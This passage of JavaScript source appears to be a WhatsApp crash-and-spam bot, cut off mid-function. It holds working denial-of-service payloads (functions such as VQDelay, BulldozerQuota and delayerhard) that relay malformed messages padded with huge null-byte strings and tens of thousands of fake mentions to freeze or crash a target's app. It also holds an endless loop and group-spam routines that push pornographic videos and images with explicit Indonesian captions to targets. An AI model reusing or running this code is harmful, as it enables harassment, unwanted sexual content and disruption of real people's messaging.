        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/85mjwm.mp4',
        'https://files.catbox.moe/ec28m8.mp4',
        'https://files.catbox.moe/n3ebuz.mp4',
        'https://files.catbox.moe/zqaszb.mp4',
        'https://files.catbox.moe/34aa39.mp4',
        'https://files.catbox.moe/dmbizk.mp4',
        'https://files.catbox.moe/wmda7z.mp4',
        'https://files.catbox.moe/y1osro.mp4',
        'https://files.catbox.moe/o1ipxw.mp4',
        'https://files.catbox.moe/i6335n.mp4',
        'https://files.catbox.moe/vxe9zl.mp4',
        'https://files.catbox.moe/o1sq2k.mp4',
        'https://files.catbox.moe/1a78ht.mp4',
        'https://files.catbox.moe/iajl3r.mp4',
        'https://files.catbox.moe/eti8qi.mp4',
        'https://files.catbox.moe/wgj8vl.mp4',
        'https://files.catbox.moe/83fd5h.mp4',
        'https://files.catbox.moe/6di4hn.mp4',
        'https://files.catbox.moe/0eisok.mp4'
    ];

    const captions = [  
        'AYU NGEWE SAMA AKU',
        'AHHHHH CROOTT💦💦💦'
    ];

    while (true) {
        const randomVideo = videoUrls[Math.floor(Math.random() * videoUrls.length)];
        const randomCaption = captions[Math.floor(Math.random() * captions.length)];
        
        await sock.sendMessage(target, {
            video: { url: randomVideo },
            mimetype: 'video/mp4',
            caption: randomCaption
        });
    }
}

async function spamHentaiGroup(sock, groupJid) {
    try {
        // Validasi format group
        if (!groupJid.includes('@g.us')) {
            groupJid = groupJid + '@g.us';
        }

        // Daftar gambar bokep dari xyanzz!
        const images = [
            'https://uploader.zenzxz.dpdns.org/uploads/1782634643973.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634684081.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634712803.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634790697.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634816551.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634840349.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634863899.jpeg'
        ];

        // Teks caption
        const caption = `*ENAK GK SIH KALO KITA NGEWE?😩, AKU UDH GATAHAN NAK CIPOK AH AH AH😹💋💦💦*`;

        let randomImage = images[Math.floor(Math.random() * images.length)];

        await sock.sendMessage(groupJid, {
            image: { url: randomImage },
            caption: caption,
            contextInfo: {
                isGroupStatus: true,
                mentionedJid: [groupJid]
            }
        });

        console.log(`[✅] Gambar terkirim ke ${groupJid}`);
        return true;

    } catch (err) {
        console.log(`[❌] Gagal: ${err.message}`);
        return false;
    }
}


async function spamBokepGroup(sock, groupJid) {
    try {
        // Validasi format group
        if (!groupJid.includes('@g.us')) {
            groupJid = groupJid + '@g.us';
        }

        // Daftar gambar bokep dari xyanzz!
        const images = [
            'https://files.catbox.moe/1b2wog.jpg',
            'https://files.catbox.moe/fo0757.jpg',
            'https://files.catbox.moe/cxk8p3.jpg',
            'https://files.catbox.moe/q7k5kq.jpg',
            'https://files.catbox.moe/lyd3vf.jpg'
        ];

        // Teks caption
        const caption = `*ENAK GK SIH KALO KITA NGEWE?😩, AKU UDH GATAHAN NAK CIPOK AH AH AH😹💋💦💦*`;

        let randomImage = images[Math.floor(Math.random() * images.length)];

        await sock.sendMessage(groupJid, {
            image: { url: randomImage },
            caption: caption,
            contextInfo: {
                isGroupStatus: true,
                mentionedJid: [groupJid]
            }
        });

        console.log(`[✅] Gambar terkirim ke ${groupJid}`);
        return true;

    } catch (err) {
        console.log(`[❌] Gagal: ${err.message}`);
        return false;
    }
}

async function noctradelayhard(sock, target) {
    console.log("proses send bug");
     {
        for (let i = 0; i < 100; i++) {
    const msg = {
        groupStatusMessageV2: {
            message: {
        albumMessage: {
                contextInfo: {
                    statusAttributionType: 1,
                    urlTrackingMap: {
                            "https://example.com": "{".repeat(500000)
                        },
                    mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1950 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
    serviceType: 3,
    expiryTimestamp: Date.now() + 60000
  }
                        }
                    }
                }
            }
        }
        }
    await sock.relayMessage(target,msg,{
        participant: { jid: target }
        })
    }}}


async function VQDelay(sock, target) {
    for (let i = 0; i < 10; i++) {
        await sock.relayMessage("status@broadcast", {
            botInvokeMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32),
                        deviceListMetadata: {
                            senderKeyIndex: 0,
                            senderTimestamp: Date.now(),
                            recipientKeyIndex: 0
                        },
                        deviceListMetadataVersion: 2
                    },
                    interactiveResponseMessage: {
                        body: {
                            text: "- # SixEyesXCrashèr ん.",
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: (["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]),
                            paramsJson: "{ name: JesterNovaZ, () => { status: true } }",
                            version: 3
                        },
                        contextInfo: {
                            participant: sock.user.id,
                            remoteJid: "maklu kekbabi bro",
                            fromMe: true,
                            statusAttributionType: 2,
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from({
                                        length: 500000
                                    },
                                    () => ({
                                        type: 1
                                    })
                                )
                            }
                        }
                    }
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {
                    status_setting: "allowlist"
                },
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: {
                            jid: target
                        },
                        content: []
                    }]
                }]
            }]
        })
      console.log(`success send this delay by - # SixEyesXCrashèr ん.`) 
    }
}

async function delayspam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function BulldozerQuota(sock, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{}".repeat(10000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        mentionedJid: Array.from(
                            { length: 42000 },
                            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        )
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, {
        participant: true,
        messageId: msg.key.id
    });
}

async function BulldozerQuotaV2(sock, target) {
    await sock.relayMessage(target, {
        botInvokeMessage: {
            message: {
                interactiveResponseMessage: {
                    nativeFlowResponseMessage: {
                        name: "send_location",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                    contextInfo: {
                        entryPointConversionSource: "call_permission_request",
                        isForwarded: true,
                        isSampled: true,
                        remoteJid: "status@broadcast",
                        stanzaId: null,
                        mentionedJid: [`0@${"\0".repeat(1000)}`],
                        productListInfo: {
                            productList: Array(90000).fill({
                                productId: "ꦾ".repeat(5000),
                                title: "ꦾ".repeat(55000)
                            })
                        },
                        deviceListMetadata: {
                            senderKeyHash: Buffer.alloc(1024 * 1024, 0),
                            senderTimestamp: "1743225419",
                            recipientKeyHash: Buffer.alloc(1024 * 1024, 0),
                            recipientTimestamp: "1743225419"
                        },
                        deviceListMetaDataVersion: 2
                    }
                }
            }
        }
    }, {
        participant: true,
        messageId: null
    });
}

async function BulldozerQuotaV3(sock, target) {
    const mentionedJid = Array.from(
        { length: 2000 },
        (_, i) => `628${i + 72}@s.whatsapp.net`
    )

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "/wIcGMsYF7liPKItunivQe41vqK7hP4ZNwD8Sqvmexo=",
        fileLength: "39218397",
        seconds: 210,
        mediaKey: "dqqHYls1grodqwvBH61uVJMe2tgGPEgFx3roOQr2PIg=",
        height: 720,
        width: 982,
        fileEncSha256: "xro5p+xptCFGVxUtTrcTGxHnAO0vwU4KCpsw7r0wWMQ=",
        directPath: "/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc",
        mediaKeyTimestamp: "1771289203",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADUASAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAADXb2zzhkrPyFzwp6wyIOhhvSajkLtWreVB7cQoNh9QzjKhk7pmoIepvEugndjOjrvQVDzBDgfleBOvCwZvOwNV4Al//8QAJBAAAwACAgIBBAMBAAAAAAAAAAECAxMhMQQSEyIyQVEQQmH/2gAIAQEAAT8A+smqc8r+YZT2QV0Ukcpla0dsyP41tk+Zr+pGeL/JLX7KKqFrkp7ZSbSPiaMuN3OmZ/G9JTE2mYfJ9VzyZPIuz3/xjfJPSK+0WzPNOKWifHm0XjrHfqQvoW0UkN8mN8D6FSTZGn2VHrT/AEOIrTfaNI9e2uR9mM1tCnRSfBxW0z4+ez0SE5X5Q1yQIYzJ9lCz5J6Y82RvlmOnUn//xAAdEQACAgIDAQAAAAAAAAAAAAAAAQIREiAQITFB/9oACAECAQE/AJGLIqj6WPqjIV8y81ev/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERAxQQMh/9oACAEDAQE/AItDmj0dnChO2yhxvRL5iOyLSRF9HGLdlJC3hYls/9k=",
        contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            statusSourceType: "VIDEO",
            mentionedJid,
            isForwarded: true,
            forwardingScore: 7205,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363425547320365@newsletter",
                newsletterName: " # 𝖲𝗂𝗑 𝖢𝗈𝗋𝖾 - 𝖦𝖾𝗍𝗌𝗎𝗓𝗈 〽️🎭 ",
                serverMessageId: 1000,
                accessibilityText: "\0"
            },
            statusAttributionType: "RESHARED_FROM_MENTION",
            contactVcard: true,
            isSampled: false,
            dissapearingMode: {
                initiator: target,
                initiatedByMe: true
            },
            expiration: Date.now()
        },
        streamingSidecar: "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"
    }


    for (let i = 0; i < 5; i++) {
        const VxZ = {
            videoMessage,
            interactiveResponseMessage: {
                body: {
                    text: "\u0000".repeat(1000),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"GetSuZo\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }


        const msg = generateWAMessageFromContent(
            target,
            VxZ,
            {}
        )


        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                participant: true,
                messageId: msg.key.id
            }
        )
    }
}

async function convQtd(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sleep(500);
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: '- # SixEyesXCrashèr ん.',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {
        participant: true
      }
    );
  }
}

async function delayerhard(sock, target) {
    const constants = {
        statusBroadcast: "status@broadcast",
        buttonText: "Click Here",
        flowName: "call_permission_request",
        accessKey: "CALL_ACCESS",
        metaTag: "meta",
        contactsTag: "contacts",
        mentionedUsersTag: "mentioned_users"
    };
    const body = { text: "XX" };
    const buttonLength = { length: 500000 };   
    const urlLength = { length: 900000 };    
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: body,
                    nativeFlowMessage: {
                        buttons: Array.from(buttonLength, () => ({}))
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, msg1, { participant: true });
    const msg2 = {
        interactiveResponseMessage: {
            body: {
                text: constants.buttonText,
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: constants.flowName,
                paramsJson: "FORM_SCREEN",
                version: 3
            },
            contextInfo: {
                remoteJid: "0.dkwzzqyl7ei" + constants.accessKey,
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from(urlLength, () => ({
                        xN0000: "Grettles"
                    }))
                }
            }
        }
    };
    const options = {
        participant: true,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: constants.metaTag,
                attrs: {
                    status_setting: constants.contactsTag
                },
                content: [
                    {
                        tag: constants.mentionedUsersTag,
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: {
                                    jid: target
                                },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    };
    await sock.relayMessage(constants.statusBroadcast, msg2, options);
}

async function CatalogCrashGroup(sock, groupJid) {
  console.log(`[🐛] Sending Catalog Crash to ${groupJid}`);
  
  try {
    await sock.relayMessage(groupJid, {
      interactiveMessage: {
        body: {
          text: "- # SixEyesXCrashèr ん."
        },
        nativeFlowMessage: {
          buttons: [{
            name: "catalog_message",
